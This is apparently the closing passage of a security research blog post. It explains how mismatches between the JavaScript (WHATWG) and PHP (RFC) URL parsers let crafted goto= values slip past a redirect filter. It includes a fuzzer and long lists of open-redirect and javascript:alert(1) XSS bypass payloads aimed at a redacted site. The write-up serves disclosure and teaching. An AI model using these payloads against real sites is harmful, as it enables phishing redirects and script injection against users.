</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%11javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%12javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%13javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%14javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%15javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%16javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%17javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%18javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%19javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Ajavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Bjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Cjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Djavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Ejavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Fjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%20javascript:alert(1)
</span></span></code></pre></div><h3 id="question4-htchartplocalhost80xxxx">Question4: ht{char}tp://localhost:80/xxxx</h3>
<p>Let&rsquo;s be a little more adventurous, can we find a character between <code>ht</code> and <code>tp</code> that the front-end URL parser still thinks the scheme part of the URL is  <code>http</code> and the host part is <code>localhost</code>?</p>
<p>fuzzer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">log</span><span style="color:#f92672">=</span>[];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10ffff</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">&#39;ht&#39;</span><span style="color:#f92672">+</span>String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;tp://localhost:80/xxxx&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">url</span>[<span style="color:#e6db74">&#39;host&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">url</span>[<span style="color:#e6db74">&#39;protocol&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;http:&#39;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;i: &#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39; URL encoded i : &#39;</span><span style="color:#f92672">+</span>encodeURI(String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>)));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">url</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log</span>
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">i</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">9</span> <span style="color:#a6e22e">URL</span> <span style="color:#a6e22e">encoded</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">09</span> <span style="color:#66d9ef">debugger</span> eval <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">URL</span> { <span style="color:#a6e22e">href</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost/xxxx&#34;</span>, <span style="color:#a6e22e">origin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost&#34;</span>, <span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http:&#34;</span>, <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#a6e22e">hostname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">pathname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/xxxx&#34;</span>, <span style="color:#a6e22e">search</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span> }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">debugger</span> eval <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">i</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span> <span style="color:#a6e22e">URL</span> <span style="color:#a6e22e">encoded</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">A</span> <span style="color:#66d9ef">debugger</span> eval <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">URL</span> { <span style="color:#a6e22e">href</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost/xxxx&#34;</span>, <span style="color:#a6e22e">origin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost&#34;</span>, <span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http:&#34;</span>, <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#a6e22e">hostname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">pathname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/xxxx&#34;</span>, <span style="color:#a6e22e">search</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span> }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">debugger</span> eval <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">i</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">13</span> <span style="color:#a6e22e">URL</span> <span style="color:#a6e22e">encoded</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">D</span> <span style="color:#66d9ef">debugger</span> eval <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">URL</span> { <span style="color:#a6e22e">href</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost/xxxx&#34;</span>, <span style="color:#a6e22e">origin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost&#34;</span>, <span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http:&#34;</span>, <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#a6e22e">hostname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">pathname</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/xxxx&#34;</span>, <span style="color:#a6e22e">search</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span> }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">debugger</span> eval <span style="color:#a6e22e">code</span><span style="color:#f92672">:</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">13</span>
</span></span><span style="display:flex;"><span>Array(<span style="color:#ae81ff">3</span>) [ <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">13</span> ]
</span></span></code></pre></div><p>payloads:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ht%0dtp://localhost
</span></span><span style="display:flex;"><span>ht%0atp://localhost
</span></span><span style="display:flex;"><span>ht%09tp://localhost
</span></span><span style="display:flex;"><span>java%09script:alert(1)
</span></span><span style="display:flex;"><span>java%0dscript:alert(1)
</span></span><span style="display:flex;"><span>java%0ascript:alert(1)
</span></span></code></pre></div><p>So how does PHP&rsquo;s URL parser handle these malformed urls?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  [&#34;ht%0dtp://localhost&#34;]=&gt;
</span></span><span style="display:flex;"><span>  array(1) {
</span></span><span style="display:flex;"><span>    [&#34;path&#34;]=&gt;
</span></span><span style="display:flex;"><span>    string(19) &#34;ht%0dtp://localhost&#34;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [&#34;ht%0atp://localhost&#34;]=&gt;
</span></span><span style="display:flex;"><span>  array(1) {
</span></span><span style="display:flex;"><span>    [&#34;path&#34;]=&gt;
</span></span><span style="display:flex;"><span>    string(19) &#34;ht%0atp://localhost&#34;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [&#34;ht%09tp://localhost&#34;]=&gt;
</span></span><span style="display:flex;"><span>  array(1) {
</span></span><span style="display:flex;"><span>    [&#34;path&#34;]=&gt;
</span></span><span style="display:flex;"><span>    string(19) &#34;ht%09tp://localhost&#34;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [&#34;java%09script:alert(1)&#34;]=&gt;
</span></span><span style="display:flex;"><span>  array(1) {
</span></span><span style="display:flex;"><span>    [&#34;path&#34;]=&gt;
</span></span><span style="display:flex;"><span>    string(22) &#34;java%09script:alert(1)&#34;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [&#34;java%0dscript:alert(1)&#34;]=&gt;
</span></span><span style="display:flex;"><span>  array(1) {
</span></span><span style="display:flex;"><span>    [&#34;path&#34;]=&gt;
</span></span><span style="display:flex;"><span>    string(22) &#34;java%0dscript:alert(1)&#34;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [&#34;java%0ascript:alert(1)&#34;]=&gt;
</span></span><span style="display:flex;"><span>  array(1) {
</span></span><span style="display:flex;"><span>    [&#34;path&#34;]=&gt;
</span></span><span style="display:flex;"><span>    string(22) &#34;java%0ascript:alert(1)&#34;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Once again, PHP&rsquo;s URL parser considers these urls to be &lsquo;canonical&rsquo; relative urls, all of which pass redacted fitler&rsquo;s check</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=ht%0dtp://baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=ht%0atp://baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=ht%09tp://baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=java%09script:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=java%0dscript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=java%0ascript:alert(1)
</span></span></code></pre></div><p>These three characters can actually be placed anywhere in scheme:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
</span></span></code></pre></div><h3 id="summary">Summary</h3>
<p>By further studying the inconsistency between javascript URL parser and php URL parser, I found more than 40 methods to bypass redacted filter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http://baidu.com\@demo.redacted.com/
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=javascript:///%250dalert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:///www.baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:\//www.baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:%0d\\www.baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:%0a\\www.baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:%09\\www.baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=javascript%0d:alert(1) 
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=javascript%0a:alert(1) 
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=javascript%09:alert(1) 
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http%09://baidu.com 
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%00javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%01javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%02javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%03javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%04javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%05javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%06javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%07javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%08javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%09javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Ajavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Bjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Cjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Djavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Ejavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Fjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%10javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%11javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%12javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%13javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%14javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%15javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%16javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%17javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%18javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%19javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Ajavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Bjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Cjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Djavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Ejavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%1Fjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%20javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=ht%0dtp://baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=ht%0atp://baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=ht%09tp://baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=java%09script:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=java%0dscript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=java%0ascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
</span></span></code></pre></div><h2 id="the-root-cause">The root cause</h2>
<p>Why is there such a big inconsistency between javascript URL parser and PHP URL parser?</p>
<p>Because there are two URL resolution standards: the RFC standard and the WHATWG standard</p>
<p>javascript URL parser follows the WHATWG standard, while PHP URL parser and other back-end language(excluding Nodejs) URL Parsers follow the RFC specification !</p>
<p>The WHATWG has developed its own set of standards based on the RFC standard: <a href="https://url.spec.whatwg.org/#url-parsing"> URL parsing </a></p>
<p>Here&rsquo;s what the WHATWG spec says:</p>
<blockquote>
<ol>
<li>If input contains any leading or trailing C0 control or space, validation error.</li>
<li>Remove any leading and trailing C0 control or space from input.</li>
</ol>
</blockquote>
<p>If the input URL starts and ends with the C0 controller and space, a validtion error is reported and all the C0 controllers and Spaces given in the input are deleted, where the range of C0 control is: 0x00-0x1F, the range of space is 0x20, so the range of C0 control + space is 0x00-0x20</p>
<p>So what is <a href="https://url.spec.whatwg.org/#validation-error">the validation error</a>?</p>
<p>The WHATWG standard is to say:</p>
<blockquote>
<p>A validation error indicates a mismatch between input and valid input. User agents, especially conformance checkers, are encouraged to report them somewhere.A validation error does not mean that the parser terminates. Termination of a parser is always stated explicitly, e.g., through a return statement.</p>
</blockquote>
<p>A validtion error simply indicates a mismatch between input and valid input, and does not imply parsing termination. The standard <code>encourages</code> implementers to report it somewhere, and parser termination is always explicitly stated, for example, by a return statement.</p>
<p>That&rsquo;s why these payloads work:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=%00javascript:alert(1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=%01javascript:alert(1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=%02javascript:alert(1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>...
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=%20javascript:alert(1)
</span></span></span></code></pre></div><p>And then the WHATWG standard says:</p>
<blockquote>
<ol>
<li>If input contains any ASCII tab or newline, validation error.</li>
<li>Remove all ASCII tab or newline from input.</li>
</ol>
</blockquote>
<p>Scope of <a href="https://infra.spec.whatwg.org/#ascii-tab-or-newline">ASCII TAB or newline</a>:</p>
<blockquote>
<p>An ASCII tab or newline is U+0009 TAB, U+000A LF, or U+000D CR.</p>
</blockquote>
<p>That&rsquo;s why these payloads work:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=ht%0dtp://baidu.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=ht%0atp://baidu.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=ht%09tp://baidu.com
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=java%09script:alert(1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=java%0dscript:alert(1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=java%0ascript:alert(1)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
</span></span></span></code></pre></div><p>This means that %0d %0a %09 can be placed anywhere in the URL, since js URL parser will remove them anyway, for example</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">&#39;http:/\x09/baidu.com&#39;</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">URL</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">origin</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http://baidu.com&#39;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">protocol</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;http:&#39;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;&#39;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;baidu.com&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="summary-1">Summary</h2>
<p>The worst thing in the world is having two sets of standards for the same thing. If there is inconsistency in the standards, there will inevitably be inconsistency in the implementation. Security issues arising from inconsistencies are concealed because when you audit a single system, you may think there are no security problems. However, when you connect multiple systems to work together, security issues will emerge. This also illustrates that when auditing security issues, it is necessary to consider the overall situation rather than auditing a single system.</p>
<p>At the same time, it is worth noting that wherever standards and specifications are not clearly defined or ambiguous, there will be discrepancies in understanding among developers who implement the standards. This can lead to inconsistencies between various languages, libraries, frameworks, and software that follow the standard implementation. Such inconsistencies are fertile ground for creating new attack techniques.</p>
<h2 id="keep-in-touch">Keep in touch</h2>
<p>If you have any questions or good research direction, please feel free to contact me:</p>
<ul>
<li>Email: <a href="mailto:hdrw1024@gmail.com">hdrw1024@gmail.com</a></li>
<li>Twitter: <a href="https://twitter.com/RuiShang9">https://twitter.com/RuiShang9</a></li>
<li>Blog: <a href="https://shangrui-hash.github.io/en/">https://shangrui-hash.github.io/en/</a></li>
<li>Medium: <a href="https://medium.com/@hdrw1024">https://medium.com/@hdrw1024</a></li>
<li>Github: <a href="https://github.com/ShangRui-hash">https://github.com/ShangRui-hash</a></li>
</ul>
<h2 id="reference">Reference</h2>
<ul>
<li><a href="https://infra.spec.whatwg.org/#c0-control-or-space">whatwg - C0 control 标准</a></li>
<li><a href="https://url.spec.whatwg.org/#url-parsing">whatwg - URL parsing 标准</a></li>
<li><a href="https://url.spec.whatwg.org/#validation-error">whatwg - validation error</a></li>
<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!</a></li>
<li><a href="https://claroty.com/wp-content/uploads/2022/01/Exploiting-URL-Parsing-Confusion.pdf">EXPLOITING URL PARSERS: THE GOOD, BAD, AND INCONSISTENT</a></li>
<li><a href="https://www.youtube.com/watch?v=0uejy9aCNbI&list=RDCMUClcE-kVhqyiHCcjYwcpfj9w&index=3">HOW FRCKN&rsquo; HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128</a></li>
<li><a href="https://www.youtube.com/watch?v=gVrdE6g_fa8&t=239s">How did Masato find the Google Search XSS?</a></li>
<li><a href="https://www.youtube.com/watch?v=yq_P3dzGiK4&t=2s">Fuzzing Browsers for weird XSS Vectors</a></li>
<li><a href="https://daniel.haxx.se/blog/2017/01/30/one-url-standard-please/">2017/Daniel Stenberg/ONE URL STANDARD PLEASE</a></li>
<li><a href="https://daniel.haxx.se/blog/2022/01/10/dont-mix-url-parsers/">2022/Daniel Stenberg/DON’T MIX URL PARSERS</a></li>
</ul>
</section>

  
  

  
  
  
  
  <nav
    class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg !leading-[1.2] *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"
  >
    
    
    <a class="ltr:ml-auto rtl:mr-auto justify-end pl-3" href="https://shangrui-hash.github.io/en/posts/xss-via-server-side-mime-sniff/"
      ><span>Server-Side MIME Sniff resulting from Go language project containerization</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a
    >
    
  </nav>
  
  

  
  

  
  

  


  
</article>


    </main>

    <footer
  class="mx-auto flex h-[4.5rem] max-w-[--w] items-center px-8 text-xs uppercase tracking-wider opacity-60"
>
  <div class="mr-auto">
  
    &copy; 2025
    <a class="link" href="https://shangrui-hash.github.io/">Writeups</a>
  
  </div>
  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
    >powered by hugo️️</a
  >️
  <a
    class="link"
    href="https://github.com/nanxiaobei/hugo-paper"
    rel="noopener"
    target="_blank"
    >hugo-paper</a
  >
</footer>

  </body>
</html>
